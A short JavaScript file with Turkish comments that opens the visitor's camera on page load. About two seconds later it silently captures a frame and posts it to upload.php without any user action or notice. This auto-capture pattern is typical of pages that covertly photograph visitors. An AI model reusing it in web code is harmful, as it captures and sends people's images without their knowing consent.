document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Kamera açma
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            // Fotoğraf çekme ve kaydetme işlemini hemen başlat
            setTimeout(capturePhoto, 2000); // 2 saniye bekle
        })
        .catch(err => {
            console.error("Kamera açılamadı: ", err);
        });

    function capturePhoto() {
        // Canvas üzerine video görüntüsünü çiz
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');
        
        // Fotoğrafı sunucuya gönder
        fetch('upload.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `image=${encodeURIComponent(imageData)}`
        })
        .then(response => response.text())
        .then(result => {
            // Kamerayı kapat
            video.srcObject.getTracks().forEach(track => track.stop());
        })
        .catch(error => {
            console.error('Fotoğraf gönderilirken bir hata oluştu:', error);
        });
    }
});
